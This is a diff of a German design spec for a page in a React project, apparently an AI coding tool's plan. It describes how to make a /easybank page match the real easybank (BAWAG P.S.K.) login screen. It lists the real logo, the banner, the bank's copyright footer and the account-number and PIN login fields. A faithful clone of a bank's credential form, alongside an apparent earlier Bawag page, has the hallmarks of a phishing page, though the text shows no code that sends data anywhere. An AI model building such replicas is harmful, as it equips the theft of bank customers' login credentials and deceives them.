@@ -1,88 +1,159 @@
 
 
-## Neue Seite `/easybank` — korrigiertes Layout
+## Easybank Seite — Komplette Korrektur
 
-### Korrigiertes Layout (aus Screenshot analysiert)
+### Alle Änderungen in `src/pages/Easybank.tsx`
+
+---
+
+### 1. HEADER
+
+**Aktuell falsch:** Logo zu groß, Sprache als 2 Buttons, dicker grüner Divider
+
+**Fixes:**
+- Logo: `h-10` → `h-7`
+- Sprachauswahl: 2 Buttons → ein `<select>` Dropdown mit "deutsch"/"english"
+- Divider: `h-[3px] bg-[#8ab528]` → `h-[1px] bg-[#c0c0c0]` (dünne graue Linie)
 
 ```text
-┌─────────────────────────────────────────────────────────────────────────┐
-│  [easybank Logo]                          Hilfe  [deutsch ▼]           │
-│                                          Dienstag, 07.04.2026 - 09:58  │
-├─────────────────────────────────────────────────────────────────────────┤
-│                                                                        │
-│  ┌────────────────────┐  ┌──────────────┐ ┌──────────┐ ┌──────────┐   │
-│  │ Login mit Zugangs- │  │  Warnung     │ │Hilfe/    │ │ Info     │   │
-│  │ daten       Hilfe  │  │              │ │Hotline   │ │          │   │
-│  │                    │  │ ⚠ Achtung    │ │          │ │ Bestell. │   │
-│  │ Wie wollen Sie     │  │ vor Phishing │ │ PIN verg.│ │ PIN-Code │   │
-│  │ sich einloggen?    │  │ Wir fordern  │ │ oder     │ │ Debitk.  │   │
-│  │                    │  │ Sie niemals  │ │ Verfüger │ │          │   │
-│  │ [Verfüger][App]    │  │ per E-Mail   │ │ gesperrt?│ │ Alle     │   │
-│  │ ──────────         │  │ oder SMS auf │ │          │ │ Infos z. │   │
-│  │                    │  │ TANs, Konto- │ │ FAQ      │ │ easybank │   │
-│  │ Verfügernr [____]  │  │ und Kredit-  │ │          │ │ App      │   │
-│  │ Verfüger ohne      │  │ karten-Daten │ │          │ │          │   │
-│  │ führende Nullen!   │  │ einzugeben   │ │          │ │ Zu       │   │
-│  │                    │  │ oder zu      │ │          │ │ Watchlist│   │
-│  │ PIN    [______] 👁 │  │ bestätigen!  │ │          │ │ Internet │   │
-│  │ 8 bis 16-stellig   │  │              │ │          │ │          │   │
-│  │                    │  │ Weiterlesen  │ │          │ │          │   │
-│  │        [Login ►]   │  │              │ │          │ │          │   │
-│  │                    │  └──────────────┘ └──────────┘ └──────────┘   │
-│  │ ► eBanking Zugang  │  ┌────────────────────────────────────────┐   │
-│  │   entsperren       │  │                                        │   │
-│  │                    │  │  [Banner: Freunde empfehlen, Link in   │   │
-│  └────────────────────┘  │   der App nutzen und Prämie erhalten]  │   │
-│                          │                                        │   │
-│                          └────────────────────────────────────────┘   │
-│                                                                        │
-├─────────────────────────────────────────────────────────────────────────┤
-│  Impressum  AGB  Datenschutz  Nutzungsbedingungen  Barrierefrei       │
-│                         © BAWAG P.S.K.                                 │
-└─────────────────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────┐
+│ [easybank Logo klein]          Hilfe  [deutsch ▼]   │
+│                       Dienstag, 07.04.2026 - 10:01  │
+├─ dünne graue Linie ────────────────────────────────-┤
 ```
 
-**Wichtig:** Die Login-Card steht links und ist höher als die 3 rechten Spalten. Das Banner-Bild sitzt **nur rechts** unter den 3 Cards (Warnung, Hilfe, Info) — NICHT unter der Login-Card und NICHT full-width.
+---
 
-### Struktur im Detail
+### 2. LOGIN CARD
 
-**Header:** Logo links, "Hilfe" + Dropdown (`deutsch`/`english`) rechts oben, Datum rechts darunter.
+**Aktuell falsch:** Beschreibungstext vorhanden, Labels ÜBER den Inputs, Login-Button hat ChevronRight
 
-**Hauptbereich — 2 Bereiche nebeneinander:**
-- **Links (~40%):** Login-Card (volle Höhe)
-- **Rechts (~60%):** Oben 3 gleich breite Cards nebeneinander, darunter Banner-Bild
+**Fixes:**
+- Beschreibungstext (Zeile 206, `t.loginQuestion`) entfernen
+- "Wie wollen Sie sich einloggen?" als erste Zeile nach dem Card-Header (nicht bold)
+- Input-Layout: 2-Spalten — Label links (~40%), Input rechts (~60%)
+- Login Button: ChevronRight entfernen, nur "Login" Text
+- Tabs: durchgehende graue Linie unter beiden Tabs, aktiver Tab hat grüne Unterstreichung darüber
 
-**Login Card:**
-- Header: "Login mit Zugangsdaten" + "Hilfe" rechts
-- "Wie wollen Sie sich einloggen?"
-- Tabs: "Verfüger" (aktiv, grüne Unterstreichung) | "Mit der App"
-- Verfüger-Tab: Verfügernummer-Input + Hinweis + PIN-Input mit Eye-Toggle + Hinweis + Login-Button (grün, rechts) + "eBanking Zugang entsperren" Link
+```text
+┌─────────────────────────────────────────┐
+│ Login mit Zugangsdaten          Hilfe   │
+│─────────────────────────────────────────│
+│                                         │
+│ Wie wollen Sie sich einloggen?          │
+│                                         │
+│  Verfüger       Mit der App             │
+│  ══════════  ─────────────────────────  │
+│                                         │
+│  Verfügernummer  [________________]     │
+│                  Verfüger ohne          │
+│                  führende Nullen!       │
+│                                         │
+│  PIN             [____________] 👁      │
+│                  8 bis 16-stellig       │
+│                                         │
+│                          [ Login ]      │
+│                                         │
+│  ► eBanking Zugang entsperren           │
+└─────────────────────────────────────────┘
+```
 
-**3 Info-Cards (rechts oben, nebeneinander):**
-- Warnung (teal Überschrift): Phishing-Warnung + "Weiterlesen"
-- Hilfe/Hotline (teal): PIN vergessen + FAQ
-- Info (teal): PIN-Code Debitkarte + easybank App + Watchlist Internet
+---
 
-**Banner (rechts unten):** `EASY26016_login.jpg` unter den 3 Cards
+### 3. WARNUNG CARD
 
-**Footer:** Impressum, AGB, Datenschutz, Nutzungsbedingungen, Barrierefrei + © BAWAG P.S.K.
+**Aktuell falsch:** Header hat teal Hintergrund mit weißem Text, falsches Icon (Lucide AlertTriangle)
 
-### Farben
-- Primär-Grün: `#8ab528` (Login-Button, aktiver Tab)
-- Teal: `#009e9a` (Card-Überschriften Warnung/Hilfe/Info)
-- Hintergrund: Weiß
-- Cards: Weiß mit dünnem grauen Border
+**Fixes:**
+- Header: Hintergrund WEIß, Text in Teal-Farbe `#009e9a`, Font größer
+- 2px grauer Divider zwischen Header und Content
+- Icon: Rotes Warnung-Dreieck als inline SVG (mittleres Icon aus dem Sprite — rotes Dreieck mit Ausrufezeichen)
+- "Achtung vor Phishing" als **bold** Titel
+- Restlicher Text normal
 
-### Sprach-Umschaltung (deutsch/english)
-Dropdown wechselt alle Texte. Englische Übersetzungen analog zu Bawag-Schema.
+```text
+┌────────────────────────┐
+│  Warnung               │ ← weißer Hintergrund, teal Font
+│────────────────────────│ ← 2px grauer Divider
+│                        │
+│  🔺 Achtung vor        │ ← rotes Dreieck-Icon (SVG)
+│     Phishing           │    "Achtung vor Phishing" = bold
+│  Wir fordern Sie       │
+│  niemals per E-Mail    │    restlicher Text = normal
+│  oder SMS auf, TANs,   │
+│  Konto- und            │
+│  Kreditkarten-Daten    │
+│  einzugeben oder zu    │
+│  bestätigen!           │
+│                        │
+│  ► Weiterlesen         │
+│                        │
+└────────────────────────┘
+```
 
-### Technisch
-- Bawag-Skalierungsmuster (BASE_WIDTH 970, transform scale)
-- Neues File: `src/pages/Easybank.tsx`
-- Route `/easybank` in `App.tsx`
-- Assets: `logo-easybank_de.png` + `EASY26016_login.jpg` → `src/assets/`
+---
 
-### Dateien
-- `src/pages/Easybank.tsx` (neu)
-- `src/App.tsx` (Route hinzufügen)
+### 4. HILFE/HOTLINE CARD
+
+**Aktuell falsch:** Header hat teal Hintergrund mit weißem Text
+
+**Fixes:**
+- Header: Hintergrund WEIß, Text in Teal `#009e9a`
+- 2px grauer Divider zwischen Header und Content
+
+```text
+┌──────────────────┐
+│ Hilfe/Hotline    │ ← weißer Hintergrund, teal Font
+│──────────────────│ ← 2px grauer Divider
+│ ► PIN vergessen  │
+│   oder Verfüger  │
+│   gesperrt?      │
+│ ► FAQ            │
+└──────────────────┘
+```
+
+---
+
+### 5. INFO CARD
+
+**Aktuell falsch:** Header hat teal Hintergrund mit weißem Text
+
+**Fixes:**
+- Header: Hintergrund WEIß, Text in Teal `#009e9a`
+- 2px grauer Divider zwischen Header und Content
+
+```text
+┌──────────────────┐
+│ Info             │ ← weißer Hintergrund, teal Font
+│──────────────────│ ← 2px grauer Divider
+│ ► Bestellung     │
+│   PIN-Code für   │
+│   Debitkarte     │
+│ ► Alle Infos zur │
+│   easybank App   │
+│ ► Zu Watchlist   │
+│   Internet       │
+└──────────────────┘
+```
+
+---
+
+### Zusammenfassung
+
+| Nr | Element | Aktuell | Korrektur |
+|----|---------|---------|-----------|
+| 1 | Logo | h-10 | h-7 |
+| 2 | Sprachauswahl | 2 Buttons | `<select>` Dropdown |
+| 3 | Header-Divider | 3px grün `#8ab528` | 1px grau `#c0c0c0` |
+| 4 | Login Beschreibungstext | vorhanden | entfernen |
+| 5 | Input-Labels | über Inputs | links neben Inputs (2-Spalten) |
+| 6 | Login Button | mit ChevronRight | ohne Chevron |
+| 7 | Tabs | keine durchgehende Linie | graue Linie + grüne aktive Unterstreichung |
+| 8 | Warnung/Hilfe/Info Header | teal Hintergrund + weiße Schrift | WEIßER Hintergrund + teal Schrift |
+| 9 | Warnung/Hilfe/Info Divider | keiner | 2px grauer Divider unter Header |
+| 10 | Warnung Icon | Lucide AlertTriangle (gelb) | Rotes Dreieck als inline SVG |
+| 11 | "Achtung vor Phishing" | normaler Text | bold |
+
+### Datei
+- `src/pages/Easybank.tsx`
 
